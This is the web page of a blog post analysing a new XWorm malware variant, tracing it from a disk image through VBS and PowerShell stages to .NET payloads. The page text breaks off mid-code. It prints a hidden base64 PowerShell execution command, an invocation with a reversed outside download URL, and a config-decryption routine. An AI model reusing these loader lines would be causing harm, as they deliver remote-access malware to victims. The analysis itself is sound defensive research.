<!doctype html>
<html lang="en-US">
  <head prefix="og: https://ogp.me/ns#">
    <meta charset="utf-8" />
    <meta name="generator" content="gh:importantimport/urara" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link rel="manifest" crossorigin="use-credentials" href="/blog/manifest.webmanifest" />
    <link rel="alternate" type="application/feed+json" href="/blog/feed.json" />
    <link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" />
    <link rel="sitemap" type="application/xml" href="/blog/sitemap.xml" />
    <meta http-equiv="content-security-policy" content="style-src 'self' 'unsafe-inline' https://giscus.app">
		<link href="../_app/immutable/assets/0.ws8ONPyK.css" rel="stylesheet">
		<link rel="modulepreload" href="../_app/immutable/entry/start.gcyZunpf.js">
		<link rel="modulepreload" href="../_app/immutable/chunks/BT34w1Kp.js">
		<link rel="modulepreload" href="../_app/immutable/chunks/C3_DH_NE.js">
		<link rel="modulepreload" href="../_app/immutable/chunks/C6P1_ZWx.js">
		<link rel="modulepreload" href="../_app/immutable/entry/app.BGxrQcjP.js">
		<link rel="modulepreload" href="../_app/immutable/chunks/C1FmrZbK.js">
		<link rel="modulepreload" href="../_app/immutable/chunks/IHki7fMi.js">
		<link rel="modulepreload" href="../_app/immutable/nodes/0.BNMb370c.js">
		<link rel="modulepreload" href="../_app/immutable/chunks/5Gp7X5ME.js">
		<link rel="modulepreload" href="../_app/immutable/chunks/DF1Jpr_l.js">
		<link rel="modulepreload" href="../_app/immutable/nodes/5.CoPGBTdH.js"><title>Hunting in the wild - XWorm new variant | Kryptoenix</title><!-- HEAD_svelte-1laq3tv_START --><link href="https://github.com/Kryptoenix" rel="me"><link href="https://webmention.io/Kryptoenix/webmention" rel="webmention"> <link href="https://webmention.io/Kryptoenix/xmlrpc" rel="pingback"><!-- HEAD_svelte-1laq3tv_END --><!-- HEAD_svelte-10yve3l_START --><link href="https://localhost:5173/blog/favicon.png" rel="shortcut icon" sizes="48x48" type="image/png"><link href="https://localhost:5173/blog/assets/kryptoenix.png" rel="apple-touch-icon" sizes="180x180" type="image/png"><link href="https://localhost:5173/blog/assets/kryptoenix.png" rel="icon" sizes="192x192" type="image/png"><!-- HEAD_svelte-10yve3l_END --><!-- HEAD_svelte-yn0p46_START --><meta name="theme-color"><!-- HEAD_svelte-yn0p46_END --><!-- HEAD_svelte-13ashyv_START --><meta content="Kryptoenix" name="author"><link href="https://localhost:5173/blog/blog/xworm-malware-analysis" rel="canonical">  <meta content="Malware Analysis, XWorm" name="keywords"> <!-- HTML_TAG_START --><link rel="authorization_endpoint" href="https://indieauth.com/auth"><!-- HTML_TAG_END --><!-- HTML_TAG_START --><link rel="token_endpoint" href="https://tokens.indieauth.com/token"><!-- HTML_TAG_END --><!-- HEAD_svelte-13ashyv_END --><!-- HEAD_svelte-1b7xa4j_START --><meta content="Kryptoenix" property="og:site_name"><meta content="en-US" property="og:locale"><meta content="article" property="og:type"> <meta content="Hunting in the wild - XWorm new variant" property="og:title">  <meta content="https://localhost:5173/blog/xworm-malware-analysis/xworm-p.png" property="og:image"> <meta content="summary_large_image" name="twitter:card"> <meta content="Malware Analysis" property="article:tag"><meta content="XWorm" property="article:tag"> <meta content="https://localhost:5173/blog/blog/xworm-malware-analysis" property="og:url"> <meta content="Kryptoenix" property="article:author"> <meta content="2024-02-17T00:00:00.000Z" property="article:published_time"> <meta content="2024-02-17T00:00:00.000Z" property="article:modified_time"><!-- HEAD_svelte-1b7xa4j_END -->
  </head>
  <body itemscope itemtype="https://schema.org/WebPage">
    <div style="display: contents">      <header class="fixed z-50 w-full transition-all duration-500 ease-in-out border-b-2 border-transparent max-h-[4.125rem]false" id="header"><div class="navbar"><div class="navbar-start">  <div class="dropdown lg:hidden"><label class="btn btn-square btn-ghost" for="navbar-dropdown" tabindex="0" data-svelte-h="svelte-18njhny"><span class="i-heroicons-outline-menu-alt-1"></span></label> <ul class="menu menu-compact dropdown-content bg-base-100 text-base-content shadow-lg rounded-box min-w-max max-w-52 p-2" id="navbar-dropdown" tabindex="0"><li><a href="/blog/about">About</a> </li></ul></div> <div class="swap order-last hidden lg:inline-grid"><button class="swap-on btn btn-ghost text-base font-normal normal-case transition-all duration-200 hidden"></button> <ul class="swap-off menu menu-horizontal p-0"><li><a class="!rounded-btn" href="/blog/about">About</a> </li></ul></div> <a class="btn btn-ghost normal-case text-lg" href="/">Kryptoenix</a></div> <div class="navbar-end"><button aria-label="search" class="btn btn-square btn-ghost" tabindex="0" data-svelte-h="svelte-17v5buh"><span class="i-heroicons-outline-search"></span></button> <div class="dropdown dropdown-end" id="change-theme">  <div class="btn btn-square btn-ghost" tabindex="0" data-svelte-h="svelte-1xk2wyd"><span class="i-heroicons-outline-color-swatch"></span></div>   <ul class="flex flex-nowrap shadow-2xl menu dropdown-content bg-base-100 text-base-content rounded-box w-52 p-2 gap-2 overflow-y-auto max-h-[21.5rem]" tabindex="0"><button class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all" data-theme="forest"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">🌲 Forest</p> <div class="grid grid-cols-4 gap-0.5 m-auto"><div class="bg-primary w-1 h-4 rounded-btn"></div><div class="bg-secondary w-1 h-4 rounded-btn"></div><div class="bg-accent w-1 h-4 rounded-btn"></div><div class="bg-neutral w-1 h-4 rounded-btn"></div></div> </button><button class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all" data-theme="cmyk"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">🖨 Light</p> <div class="grid grid-cols-4 gap-0.5 m-auto"><div class="bg-primary w-1 h-4 rounded-btn"></div><div class="bg-secondary w-1 h-4 rounded-btn"></div><div class="bg-accent w-1 h-4 rounded-btn"></div><div class="bg-neutral w-1 h-4 rounded-btn"></div></div> </button><button class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all" data-theme="dracula"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">🧛 Dark</p> <div class="grid grid-cols-4 gap-0.5 m-auto"><div class="bg-primary w-1 h-4 rounded-btn"></div><div class="bg-secondary w-1 h-4 rounded-btn"></div><div class="bg-accent w-1 h-4 rounded-btn"></div><div class="bg-neutral w-1 h-4 rounded-btn"></div></div> </button><button class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all" data-theme="synthwave"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">🌃 Synthwave</p> <div class="grid grid-cols-4 gap-0.5 m-auto"><div class="bg-primary w-1 h-4 rounded-btn"></div><div class="bg-secondary w-1 h-4 rounded-btn"></div><div class="bg-accent w-1 h-4 rounded-btn"></div><div class="bg-neutral w-1 h-4 rounded-btn"></div></div> </button></ul></div></div></div></header> <button aria-label="scroll to top" class="fixed grid group btn btn-circle btn-lg border-none backdrop-blur bottom-6 right-6 z-50 duration-500 ease-in-outbtn-ghost bg-base-100/30 md:bg-base-200/30  translate-y-24" id="totop"> <div class="radial-progress text-accent transition-all duration-500 ease-in-out group-hover:text-[color-mix(in_oklab,oklch(var(--a)),black_7%)] col-start-1 row-start-1" style="--size:4rem; --thickness: 0.25rem; --value:undefined;"></div> <div class="border-4 border-base-content/10 group-hover:border-transparent col-start-1 row-start-1 rounded-full w-full h-full p-4 grid duration-500 ease-in-out" data-svelte-h="svelte-1lpt3af"><span class="i-heroicons-solid-chevron-up !w-6 !h-6"></span></div></button> <div class="bg-base-100 md:bg-base-200 min-h-screen pt-16 md:pb-8 lg:pb-16">  <div class="flex flex-col flex-nowrap justify-center xl:flex-row xl:flex-wrap"><div class="flex-1 w-full order-first ease-out transform mx-auto xl:mr-0 xl:ml-0"></div> <div class="flex-1 w-full xl:order-last ease-out transform mx-auto xl:ml-0 xl:mr-0"></div> <div class="flex-none w-full max-w-screen-md mx-auto xl:mx-0"><article itemscope itemtype="https://schema.org/BlogPosting" itemprop="blogPost" class="h-entry card bg-base-100 rounded-none md:rounded-box md:shadow-lg md:shadow-grey-10 overflow-hidden z-10 md:mb-8 lg:mb-16"><div id="bridgy" class="hidden"><a href="https://brid.gy/publish/mastodon">mastodon</a></div>   <div class="card-body gap-0 "><div class="flex flex-col gap-2"><figure class="md:order-last rounded-lg mb-4 flex-col gap-2 -mt-8 md:mt-0'
          }"><picture><source srcset="/blog/_app/immutable/assets/xworm-p.B0rXE4ZL.avif 736w" type="image/avif"> <img alt="/xworm-malware-analysis/xworm-p.png" class="u-featured" decoding="async" loading="lazy" src="/xworm-malware-analysis/xworm-p.png"></picture></figure> <div class="flex font-semibold gap-1.5"><a class="opacity-75 hover:opacity-100 hover:text-primary duration-500 ease-in-out p-author h-card" href="https://localhost:5173/blog" rel="author">Kryptoenix</a> <span class="opacity-50" data-svelte-h="svelte-1ijzl0g">/</span> <a class="u-url u-uid swap group/time" href="/blog/xworm-malware-analysis"><time class="group-hover/time:opacity-0 font-semibold opacity-75 duration-500 ease-in-out mr-auto dt-published" datetime="2024-02-17T00:00:00.000Z" itemprop="datePublished">Saturday, Feb 17, 24</time> <time class="opacity-0 group-hover/time:opacity-100 font-semibold text-primary duration-500 ease-in-out mr-auto dt-updated" datetime="2024-02-17T00:00:00.000Z" itemprop="dateModified">Saturday, Feb 17, 24</time></a></div> <h1 itemprop="name headline" class="card-title text-2xl mb-8 p-name">Hunting in the wild - XWorm new variant</h1> </div> <main itemprop="articleBody" class="urara-prose prose e-content"><h2 id="introduction" data-svelte-h="svelte-ccveyw"><a href="#introduction">Introduction</a></h2> <p data-svelte-h="svelte-l0ad4k">Hello there, welcome to the board! I’m openning this blog series with an exciting topic: malware analysis. I will start by collecting pieces for our puzzle and continue to combine them until, by the end of journey, each piece contributes to the bigger picture.</p> <p data-svelte-h="svelte-kka84p"><a href="https://bazaar.abuse.ch/" rel="nofollow noopener noreferrer external" target="_blank"><em>MalwareBazaar</em></a> website provides a large database of malware samples, where researchers can report different files which might seem suspicious. Today, while I was searching for potential subject for analysis, I stumbled upon an interesting archive. This was found as part of an email attachment in a malware campaign. The sample can be found <a href="https://bazaar.abuse.ch/sample/76fbfcb8754ba7e23c855a71db83aae75c106d84e106330b772cf3a28a440993/#comments" rel="nofollow noopener noreferrer external" target="_blank">here</a>.</p> <h2 id="first-sign-of-malicious-code" data-svelte-h="svelte-143uk5j"><a href="#first-sign-of-malicious-code">First sign of malicious code</a></h2> <p data-svelte-h="svelte-guxtjo">The initial archive contains a disk image <code>.img</code> file, a known format for executing code once the victim clicks the file. If this is not yet suspicious, let’s inspect for visible signs that might indicate unwanted behaviour such as download links. For this step, I used a powerful utiliy called <code>binwalk</code>, capable of extracting bundled files.</p> <!-- HTML_TAG_START --><pre class="shiki monokai with-title" style="background-color: #272822; color: #F8F8F2" bash="true" title="extract files from disk image"><div class='code-title'>extract files from disk image</div><div class="language-id">bash</div><div class='code-container'><code><div class='line'><span style="color: #F8F8F2">binwalk -e Damaged_item.img</span></div></code></div></pre><!-- HTML_TAG_END --> <p data-svelte-h="svelte-1h3vs2a">Now, a new folder <code>iso-root</code> contains a friendly-looking <code>VBS</code> script.</p> <p><img alt="damaged-itemvbs.png" class="rounded-lg my-2" decoding="async" loading="lazy" src="damaged-itemvbs.png"></p> <p data-svelte-h="svelte-gqvjlb">The script simply tries to download the content found at a Pastebin link and then execute the fetched code using <code>ExecuteGlobal</code> function. Good news, the link was suspended and therefore, the following code cannot be executed anymore, preventing victims from infection. Defenders and Pastebin support did great work in such a short period of time (less than 18h :)). Fortunately, I was able to extract the next stage of <code>VBS</code> code (the code from Pastebin link) before removal. Let’s analyse it!</p> <p><img alt="fetched-vbs.png" class="rounded-lg my-2" decoding="async" loading="lazy" src="fetched-vbs.png"></p> <p data-svelte-h="svelte-18du20p">We are dealing with some obfuscation, so it would be faster if we can find a way to print the final code (after deobfuscation, but before execution). This way, we can get a clear understanding of what’s under the hood. Some hints suggest that deobfuscated code is powershell. The plan is to write the final code to a powershell script.</p> <!-- HTML_TAG_START --><pre class="shiki monokai with-title" style="background-color: #272822; color: #F8F8F2" vb="true" title="code appended to the end of obfuscated VBS"><div class='code-title'>code appended to the end of obfuscated VBS</div><div class="language-id">vb</div><div class='code-container'><code><div class='line'><span style="color: #66D9EF">Set </span><span style="color: #F8F8F2">fso </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">CreateObject</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">"Scripting.FileSystemObject"</span><span style="color: #F8F8F2">)</span></div><div class='line'><span style="color: #66D9EF">Set </span><span style="color: #F8F8F2">outputFile </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> fso.</span><span style="color: #A6E22E">CreateTextFile</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">"deobfuscated.ps1"</span><span style="color: #F8F8F2">,</span><span style="color: #AE81FF"> True</span><span style="color: #F8F8F2">)</span></div><div class='line'><span style="color: #F8F8F2">outputFile.WriteLine durguete</span></div></code></div></pre><!-- HTML_TAG_END --> <p data-svelte-h="svelte-rqfhvz">Once we append this code and execute the whole script, <code>deobfuscated.ps1</code> file will help us in the next stage.</p> <h2 id="new-language-old-friend" data-svelte-h="svelte-1wjvziz"><a href="#new-language-old-friend">New language, old friend</a></h2> <p data-svelte-h="svelte-172y4m2">It becomes clear that attacker tries to hide as much as possible by adding polimorphic code, with many layers of obfuscation. The recovered <code>PS1</code> script replaces some substrings in <code>$codigo</code> variable, decodes it in <code>base64</code> and executes the code using a classic powershell technique.</p> <!-- HTML_TAG_START --><pre class="shiki monokai" style="background-color: #272822; color: #F8F8F2" powershell="true"><div class="language-id">powershell</div><div class='code-container'><code><div class='line'><span style="color: #F8F8F2">powershell </span><span style="color: #F92672">-</span><span style="color: #F8F8F2">command </span><span style="color: #E6DB74">"</span><span style="color: #F8F8F2">$codigo</span><span style="color: #E6DB74"> = 'ZgB1DgTreG4DgTreYwB0DgTreGkDgTrebw &lt;-- stripped --&gt; eKQB9DgTreCDgTreDgTrefQDgTre=';</span><span style="color: #F8F8F2">$oWjuxd</span><span style="color: #E6DB74"> = [system.Text.encoding]::Unicode.GetString([system.convert]::Frombase64string( </span><span style="color: #F8F8F2">$codigo</span><span style="color: #E6DB74">.replace('DgTre','A') ));powershell.exe -windowstyle hidden -executionpolicy bypass -Noprofile -command </span><span style="color: #F8F8F2">$OWjuxD</span><span style="color: #E6DB74">"</span></div></code></div></pre><!-- HTML_TAG_END --> <p data-svelte-h="svelte-5hhyp2">After decoding, we are left with another powershell script. It is more verbose than the previous one.</p> <p><img alt="deobfs2.png" class="rounded-lg my-2" decoding="async" loading="lazy" src="deobfs2.png"></p> <p data-svelte-h="svelte-nu44gi">Let’s break it into smaller pieces. The variable <code>@links</code>  contains links used by <code>DownloadDataFromLinks()</code> function to download an image (chosen at random). Now comes the interesting part. The actual downloaded image contain an embedded <code>.NET</code> assembly (<code>$loadedAssembly</code> and <code>GetMethod</code> are clear signs that we are dealing with .NET code). I will adapt this PS1 script such that, after downloading and decoding are complete, variable <code>$commandBytes</code> will write its content to an output file <code>malware-net</code>. Below is a small snippet of what’s being changed in the original code:</p> <p data-svelte-h="svelte-1y662yu">Additional decoding is required in order to extract the assembly properly. For that, <code>CyberChef</code> tool will simplify things a lot using this <a href="https://gchq.github.io/CyberChef/#recipe=Decode_text('UTF-16LE%2520(1200)')Find_/_Replace(%257B'option':'Regex','string':'%255C%255Cr%255C%255Cn'%257D,'%2520',true,false,true,false)From_Decimal('Space',false)" rel="nofollow noopener noreferrer external" target="_blank">recipe</a>.</p> <h2 id="decompiling-the-culprit" data-svelte-h="svelte-1akbftj"><a href="#decompiling-the-culprit">Decompiling the culprit</a></h2> <p data-svelte-h="svelte-12llahp">We take a look at the first bytes and notice that they represent the file signature for an executable <code>.EXE</code>. Inspect it’s properties to gain new insights.</p> <img src="malware.png" alt="Malware Image" width="500" style="display: block; margin-left: auto; margin-right: auto;"> <p data-svelte-h="svelte-ma4w3b">Seems like this campaign is addressed to spanish speaking victims. Maybe it was sent to employees of some companies since the description is related to an <code>Automation project</code>?</p> <p data-svelte-h="svelte-1v50k1f">So far, the executable won’t pose dificulties because it’s written in an intepreted language, making it easier to retrieve the original code. <a href="https://github.com/icsharpcode/ILSpy0" rel="nofollow noopener noreferrer external" target="_blank"><em>ILSpy</em></a> is a great tool for decompiling .NET binaries, suitable for our purpose. (Open the image in a new tab if you don’t see the code)</p> <p><img alt="decompiled1.png" class="rounded-lg my-2" decoding="async" loading="lazy" src="decompiled1.png"></p> <p data-svelte-h="svelte-23ztk8">This is one functionality of the binary through which the malware tries to gain persistence by abusing widely-known start-up registry <code>SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code>. Other functionalities found include: using D/Invoke syscall, creating new processes under the path of <code>cmd.exe</code> and another one related to .NET framework.</p> <p><img alt="malhelper.png" class="rounded-lg my-2" decoding="async" loading="lazy" src="malhelper.png"></p> <p data-svelte-h="svelte-yzv1ld">Remember that in previously discussed powershell script, a method was invoked on this assembly, <code>VAI</code>:</p> <!-- HTML_TAG_START --><pre class="shiki monokai with-title" style="background-color: #272822; color: #F8F8F2" powershell="true" title="snipped from second powershell script"><div class='code-title'>snipped from second powershell script</div><div class="language-id">powershell</div><div class='code-container'><code><div class='line'><span style="color: #F8F8F2">$method </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> $type.GetMethod(</span><span style="color: #E6DB74">'VAI'</span><span style="color: #F8F8F2">).Invoke(</span><span style="color: #AE81FF">$null</span><span style="color: #F92672">,</span><span style="color: #F8F8F2"> [</span><span style="color: #66D9EF">object</span><span style="color: #F8F8F2">[]](</span><span style="color: #E6DB74">'441ae23bb6fe-0269-74a4-c2ae-4ebc2dab=nekot&aidem=tla?txt.102061mrowxnhoj/o/moc.topsppa.64038-metsys-eciovni/b/0v/moc.sipaelgoog.egarotsesaberif//:sptth'</span><span style="color: #F92672">,</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">'1'</span><span style="color: #F92672">,</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">'C:ProgramData'</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">,</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">'Name '</span><span style="color: #F92672">,</span><span style="color: #E6DB74">' AddInProcess32 '</span><span style="color: #F92672">,</span><span style="color: #E6DB74">' '</span><span style="color: #F8F8F2">))&#125; &#125;</span></div></code></div></pre><!-- HTML_TAG_END --> <p data-svelte-h="svelte-v92x8g">In ILSpy, we can see that <code>VAI</code> is responsible for reversing and downloading the file from link. After that, the file obtained is reversed and decoded in base64.</p> <p><img alt="toolsmal.png" class="rounded-lg my-2" decoding="async" loading="lazy" src="toolsmal.png"></p> <h2 id="searching-for-keys" data-svelte-h="svelte-bjozqq"><a href="#searching-for-keys">Searching for keys?</a></h2> <p data-svelte-h="svelte-1nxiwqm">This hunting brought us to a new .NET binary. We can confirm its signature:</p> <!-- HTML_TAG_START --><pre class="shiki monokai" style="background-color: #272822; color: #F8F8F2" bash="true"><div class="language-id">bash</div><div class='code-container'><code><div class='line highlight'><span style="color: #F8F8F2">$ file mal2.exe</span></div><div class='line dim'><span style="color: #F8F8F2">mal2.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, </span><span style="color: #F92672">for</span><span style="color: #F8F8F2"> MS Windows, 3 sections</span></div></code></div></pre><!-- HTML_TAG_END --> <p data-svelte-h="svelte-1dnjm7i">Through decompilation, we find a vast number of functions related to malitious behaviour. In <code>Main</code> function, some variables are decrypted using <code>AES</code> in <code>ECB mode</code>. These “setting” variables will be used later in establishing connections between victim and attacker’s C&amp;C infrastructure.</p> <p><img alt="worm1.png" class="rounded-lg my-2" decoding="async" loading="lazy" src="worm1.png"></p> <p><img alt="worm2.png" class="rounded-lg my-2" decoding="async" loading="lazy" src="worm2.png"></p> <p data-svelte-h="svelte-y5a8fg">Based on the known values of encrypted strings and encoded key, it is possible to recover the plaintext values using a similar decryption routine used in encryption:</p> <!-- HTML_TAG_START --><pre class="shiki monokai" style="background-color: #272822; color: #F8F8F2" csharp="true"><div class="language-id">csharp</div><div class='code-container'><code><div class='line'><span style="color: #F92672">using</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">System</span><span style="color: #F8F8F2">;</span></div><div class='line'><span style="color: #F92672">using</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">System</span><span style="color: #F8F8F2">.</span><span style="color: #A6E22E">Security</span><span style="color: #F8F8F2">.</span><span style="color: #A6E22E">Cryptography</span><span style="color: #F8F8F2">;</span></div><div class='line'><span style="color: #F92672">using</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">System</span><span style="color: #F8F8F2">.</span><span style="color: #A6E22E">Text</span><span style="color: #F8F8F2">;</span></div><div class='line'><span style="color: #F92672">public</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">class</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">Settings</span></div><div class='line'><span style="color: #F8F8F2">&#123;</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #F92672">public</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">static</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">string</span><span style="color: #F8F8F2"> Host </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">"8wEbreuCNstcX+VMVrMtN79nabenssi23ZA2UwI0sBw="</span><span style="color: #F8F8F2">;</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #F92672">public</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">static</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">string</span><span style="color: #F8F8F2"> Port </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">"NHj6D/XmlURhrDZN4bCpqA=="</span><span style="color: #F8F8F2">;</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #F92672">public</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">static</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">string</span><span style="color: #F8F8F2"> KEY </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">"tGwHQrFuqEZ9E5eQxvPElQ=="</span><span style="color: #F8F8F2">;</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #F92672">public</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">static</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">string</span><span style="color: #F8F8F2"> SPL </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">"A6XU+/uh3DsQy74ojVhAhQ=="</span><span style="color: #F8F8F2">;</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #F92672">public</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">static</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">int</span><span style="color: #F8F8F2"> Sleep </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">3</span><span style="color: #F8F8F2">;</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #F92672">public</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">static</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">string</span><span style="color: #F8F8F2"> USBNM </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">"k6tUhyBB8c9OnCp0im2vjw=="</span><span style="color: #F8F8F2">;</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #F92672">public</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">static</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">string</span><span style="color: #F8F8F2"> Mutex </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">"mrkh245537gVoEKF"</span><span style="color: #F8F8F2">;</span></div><div class='line'><span style="color: #F8F8F2">&#125;</span></div><div class='line'><span style="color: #F92672">public</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">class</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">AlgorithmAES</span></div><div class='line'><span style="color: #F8F8F2">&#123;</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #F92672">public</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">static</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">string</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">Decrypt</span><span style="color: #F8F8F2">(</span><span style="color: #F92672">string</span><span style="color: #F8F8F2"> input)</span></div><div class='line'><span style="color: #F8F8F2">    &#123;</span></div><div class='line'><span style="color: #F8F8F2">        </span><span style="color: #A6E22E">RijndaelManaged</span><span style="color: #F8F8F2"> rijndaelManaged </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">new</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">RijndaelManaged</span><span style="color: #F8F8F2">();</span></div><div class='line'><span style="color: #F8F8F2">        </span><span style="color: #A6E22E">MD5CryptoServiceProvider</span><span style="color: #F8F8F2"> mD5CryptoServiceProvider </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">new</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">MD5CryptoServiceProvider</span><span style="color: #F8F8F2">();</span></div><div class='line'><span style="color: #F8F8F2">        </span><span style="color: #F92672">byte</span><span style="color: #F8F8F2">[] array </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">new</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">byte</span><span style="color: #F8F8F2">[</span><span style="color: #AE81FF">32</span><span style="color: #F8F8F2">];</span></div><div class='line'><span style="color: #F8F8F2">        </span><span style="color: #F92672">byte</span><span style="color: #F8F8F2">[] sourceArray </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> mD5CryptoServiceProvider.</span><span style="color: #A6E22E">ComputeHash</span><span style="color: #F8F8F2">(</span><span style="color: #A6E22E">UTF8SB</span><span style="color: #F8F8F2">(Settings.Mutex));</span></div><div class='line'><span style="color: #F8F8F2">        Array.</span><span style="color: #A6E22E">Copy</span><span style="color: #F8F8F2">(sourceArray, </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2">, array, </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2">, </span><span style="color: #AE81FF">16</span><span style="color: #F8F8F2">);</span></div><div class='line'><span style="color: #F8F8F2">        Array.</span><span style="color: #A6E22E">Copy</span><span style="color: #F8F8F2">(sourceArray, </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2">, array, </span><span style="color: #AE81FF">15</span><span style="color: #F8F8F2">, </span><span style="color: #AE81FF">16</span><span style="color: #F8F8F2">);</span></div><div class='line'><span style="color: #F8F8F2">        rijndaelManaged.Key </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> array;</span></div><div class='line'><span style="color: #F8F8F2">        rijndaelManaged.Mode </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> CipherMode.ECB;</span></div><div class='line'><span style="color: #F8F8F2">        </span><span style="color: #A6E22E">ICryptoTransform</span><span style="color: #F8F8F2"> cryptoTransform </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> rijndaelManaged.</span><span style="color: #A6E22E">CreateDecryptor</span><span style="color: #F8F8F2">();</span></div><div class='line'><span style="color: #F8F8F2">        </span><span style="color: #F92672">byte</span><span style="color: #F8F8F2">[] array2 </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> Convert.</span><span style="color: #A6E22E">FromBase64String</span><span style="color: #F8F8F2">(input);</span></div><div class='line'><span style="color: #F8F8F2">        </span><span style="color: #F92672">byte</span><span style="color: #F8F8F2">[] decryptedBytes </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> cryptoTransform.</span><span style="color: #A6E22E">TransformFinalBlock</span><span style="color: #F8F8F2">(array2, </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2">, array2.Length);</span></div><div class='line'><span style="color: #F8F8F2">        </span><span style="color: #F92672">return</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">UTF8BS</span><span style="color: #F8F8F2">(decryptedBytes);</span></div><div class='line'><span style="color: #F8F8F2">    &#125;</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #F92672">private</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">static</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">byte</span><span style="color: #F8F8F2">[] </span><span style="color: #A6E22E">UTF8SB</span><span style="color: #F8F8F2">(</span><span style="color: #F92672">string</span><span style="color: #F8F8F2"> s)</span></div><div class='line'><span style="color: #F8F8F2">    &#123;</span></div><div class='line'><span style="color: #F8F8F2">        </span><span style="color: #F92672">return</span><span style="color: #F8F8F2"> Encoding.UTF8.</span><span style="color: #A6E22E">GetBytes</span><span style="color: #F8F8F2">(s);</span></div><div class='line'><span style="color: #F8F8F2">    &#125;</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #F92672">private</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">static</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">string</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">UTF8BS</span><span style="color: #F8F8F2">(</span><span style="color: #F92672">byte</span><span style="color: #F8F8F2">[] b)</span></div><div class='line'><span style="color: #F8F8F2">    &#123;</span></div><div class='line'><span style="color: #F8F8F2">        </span><span style="color: #F92672">return</span><span style="color: #F8F8F2"> Encoding.UTF8.</span><span style="color: #A6E22E">GetString</span><span style="color: #F8F8F2">(b);</span></div><div class='line'><span style="color: #F8F8F2">    &#125;</span></div><div class='line'><span style="color: #F8F8F2">&#125;</span></div><div class='line'><span 